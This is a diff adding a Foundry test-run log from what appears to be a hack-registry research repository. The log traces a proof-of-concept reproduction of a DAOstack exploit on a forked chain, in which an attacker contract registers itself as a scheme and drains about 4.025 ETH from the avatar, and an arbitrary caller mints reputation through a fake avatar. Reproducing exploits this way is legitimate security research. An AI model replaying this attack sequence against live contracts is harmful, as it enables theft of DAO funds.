+    │   │   │   ├─ emit BurnReputation(param0: 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba, param1: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 200000000000000000000 [2e20], param3: 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   ├─ [3199] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::burn(DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 200000000000000000000 [2e20])
+    │   │   │   │   ├─ emit Burn(from: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 200000000000000000000 [2e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000064c225b6b1a24e91000 → 0x0000000000000000000000000000000000000000000006414accaebf5ec91000
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000000000043c33c1937564800000 → 0x0000000000000000000000000000000000000000000004315c32d71a9e600000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  emit topic 0: 0x066c061a3792cb3eb64a441a928655fcbafb4a54b49725fe9cd2951df5e7189e
+    │   │   │        topic 1: 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde
+    │   │   │        topic 2: 0x0000000000000000000000007b11dfb29504abc8c0dfa60dc7e0aa2aae836db0
+    │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000043c33c1937564800000
+    │   │   ├─ [544] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::nativeReputation()
+    │   │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   │   ├─ [284] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::totalSupply()
+    │   │   │   └─ ← [Return] 29538627137000000000000 [2.953e22]
+    │   │   ├─  emit topic 0: 0xcd02fbb837f4db88fe889871e55fa24a4e2f5f1f2cd8c993593bde0397cc2553
+    │   │   │        topic 1: 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde
+    │   │   │        topic 2: 0x0000000000000000000000007b11dfb29504abc8c0dfa60dc7e0aa2aae836db0
+    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000006414accaebf5ec910000000000000000000000000000000000000000000000000000000000000000002
+    │   │   ├─ [43570] 0x781f48F300f9c2f4862347537927FC9Dc48415E0::execute(0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, 1)
+    │   │   │   ├─ [588] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::owner()
+    │   │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   │   ├─ [722] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::getSchemeParameters(0x781f48F300f9c2f4862347537927FC9Dc48415E0, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   │   └─ ← [Return] 0x32896dcf957e38712dbd2aaf1b0c124f15d8f0e52a11a94949c47a0dd8b4ed5a
+    │   │   │   ├─ emit ProposalDeleted(param0: 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, param1: 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde)
+    │   │   │   ├─ [588] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::owner()
+    │   │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   │   ├─ [33127] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::registerScheme(DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000001f, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   │   ├─ emit RegisterScheme(param0: 0x781f48F300f9c2f4862347537927FC9Dc48415E0, param1: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x3a942c2803cef086df671cfc05caf22818f104c6de5c9f2c9134c145c90c1b94: 0 → 31
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─  emit topic 0: 0xd2632e80f5364f02aded1c64e8a04637b7c8bb9c2db2bedf4b6ac47c013acbc0
+    │   │   │   │        topic 1: 0x0000000000000000000000007b11dfb29504abc8c0dfa60dc7e0aa2aae836db0
+    │   │   │   │        topic 2: 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde
+    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67eb0: 31 → 0
+    │   │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67eaf: 1 → 0
+    │   │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67ead: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f → 0
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b94: 2 → 1
+    │   │   │   @ 0x9b73bb9dd3d4c5edd7a1bd2a096e4fc3f333fed70e134ec6ad749e96c8e9622c: 0 → 0x00000000000000000000000000000000000000000000043c33c1937564800000
+    │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b8c: 0 → 0x00000000000000000000000000000000000000000000043c33c1937564800000
+    │   │   │   @ 0x1f11412e98d563801f6d2938f59d5db58f64354ec3e95fd42b3af50c3469288b: 0 → 0x00000000000000000000000000000000000000000000043c33c1937564800000
+    │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b93: 3 → 2
+    │   │   │   @ 0x9b73bb9dd3d4c5edd7a1bd2a096e4fc3f333fed70e134ec6ad749e96c8e9622d: 0 → 1
+    │   │   │   @ 0x9b73bb9dd3d4c5edd7a1bd2a096e4fc3f333fed70e134ec6ad749e96c8e9622b: 0 → 1
+    │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b8e: 0 → 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000
+    │   │   └─ ← [Return] true
+    │   ├─ [13833] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::sendEther(4025000000000000000 [4.025e18], DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   ├─ emit SendEther(param0: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 4025000000000000000 [4.025e18], param2: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ [9228] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::sendEther(4025000000000000000 [4.025e18], DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─ [55] DAOstackExploit::receive{value: 4025000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit SendEther(param0: 4025000000000000000 [4.025e18], param1: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Return] true
+    │   ├─ [55] DAOstackExploitTest::receive{value: 4025577021548053172}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [284] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::totalSupply() [staticcall]
+    │   └─ ← [Return] 29538627137000000000000 [2.953e22]
+    ├─ [0] VM::assertEq(19800000000000000000000 [1.98e22], 19800000000000000000000 [1.98e22], "net reputation minted (mint 20000 - 200 vote cost)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0, "avatar drained") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqAbs(4025577021548053172 [4.025e18], 4025000000000000000 [4.025e18], 1000000000000000 [1e15], "reproduced drain approximates 4.025 ETH") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 4025577021548053172 [4.025e18], decimals: 18)
+    └─ ← [Stop]
+
+[PASS] testNewOrganizationIsPermissionless() (gas: 553308)
+Traces:
+  [5960] DAOstackExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 26059089 [2.605e7])
+    │   └─ ← [Return] 1
+    └─ ← [Stop]
+
+  [553308] DAOstackExploitTest::testNewOrganizationIsPermissionless()
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC]
+    ├─ [0] VM::label(stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], "stranger")
+    │   └─ ← [Return]
+    ├─ [2638] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::reputationOf(stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "stranger starts with no reputation") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC])
+    │   └─ ← [Return]
+    ├─ [303716] → new FakeAvatar@0x76AB0107C57Aa835AF2329e9230C5240E0B6c608
+    │   ├─ [12464] → new Stub@0x8FC2722D8a3f180B4F6d8eBE7bCCF87d531B8d4F
+    │   │   └─ ← [Return] 62 bytes of code
+    │   ├─ [12464] → new Stub@0x46fb970c92cb5486a0a32FC3e50F2f7C3BA7cC0d
+    │   │   └─ ← [Return] 62 bytes of code
+    │   └─ ← [Return] 1066 bytes of code
+    ├─ [156989] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::newOrganization(FakeAvatar: [0x76AB0107C57Aa835AF2329e9230C5240E0B6c608])
+    │   ├─ [402] FakeAvatar::owner()
+    │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   ├─ [22813] FakeAvatar::nativeReputation()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 1
+    │   │   └─ ← [Return] Stub: [0x8FC2722D8a3f180B4F6d8eBE7bCCF87d531B8d4F]
+    │   ├─ [22859] FakeAvatar::nativeToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 1
+    │   │   └─ ← [Return] Stub: [0x46fb970c92cb5486a0a32FC3e50F2f7C3BA7cC0d]
+    │   ├─ [969] FakeAvatar::nativeToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 1 → 2
+    │   │   └─ ← [Return] 0xe30a71938b743d126E977A2b3F7450484F209a34
+    │   ├─ [923] FakeAvatar::nativeReputation()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 1 → 2
+    │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   ├─ [923] FakeAvatar::nativeReputation()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 2 → 3
+    │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   ├─ [969] FakeAvatar::nativeToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 2 → 3
+    │   │   └─ ← [Return] 0xe30a71938b743d126E977A2b3F7450484F209a34
+    │   ├─ emit RegisterScheme(param0: stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], param1: stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], param2: FakeAvatar: [0x76AB0107C57Aa835AF2329e9230C5240E0B6c608])
+    │   ├─  storage changes:
+    │   │   @ 0x2df2e83feef79768be5561106da46cb00f0e451158efd6d6f084930d694101e0: 0 → 0x0000000000000000000000006256294145fb529db7b248eb86b4e6ef30f55bf9
+    │   │   @ 0x2df2e83feef79768be5561106da46cb00f0e451158efd6d6f084930d694101df: 0 → 0x000000000000000000000000e30a71938b743d126e977a2b3f7450484f209a34
+    │   │   @ 0xf18d4edb794a4fa0a38a1c72b43dfba760654caf500b7d2f7382a2c2966e0c0f: 0 → 31
+    │   │   @ 0x2df2e83feef79768be5561106da46cb00f0e451158efd6d6f084930d694101e6: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [39406] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::mintReputation(1234000000000000000000 [1.234e21], stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], FakeAvatar: [0x76AB0107C57Aa835AF2329e9230C5240E0B6c608])
+    │   ├─ emit MintReputation(param0: stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], param1: stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], param2: 1234000000000000000000 [1.234e21], param3: FakeAvatar: [0x76AB0107C57Aa835AF2329e9230C5240E0B6c608])
+    │   ├─ [29579] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::mint(stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], 1234000000000000000000 [1.234e21])
+    │   │   ├─ emit Mint(to: stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC], amount: 1234000000000000000000 [1.234e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x00000000000000000000000000000000000000000000020fee99d7a4c0691000 → 0x000000000000000000000000000000000000000000000252d3ca85a1a0711000
+    │   │   │   @ 0xd346931b5cf3eb95472d07eb0bb1a2569ca510bfa8836903ad7cda8030d930a6: 0 → 0x000000000000000000000000000000000000000000000042e530adfce0080000
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "mint on the victim's reputation succeeded for an arbitrary caller") [staticcall]
+    │   └─ ← [Return]
+    ├─ [638] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::reputationOf(stranger: [0x49052147F5D97A723DEBdf07680fFFaDAd29A5dC]) [staticcall]
+    │   └─ ← [Return] 1234000000000000000000 [1.234e21]
+    ├─ [0] VM::assertEq(1234000000000000000000 [1.234e21], 1234000000000000000000 [1.234e21], "arbitrary caller minted on a reputation it never owned - no uniqueness guard") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.01s (16.52ms CPU time)
+
+Ran 1 test suite in 7.96s (4.01s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+/Users/alex/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71:  9958 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /Users/alex/RustroverProjects/audits/evm-hack-registry/2026-09-DAOstack_exp)
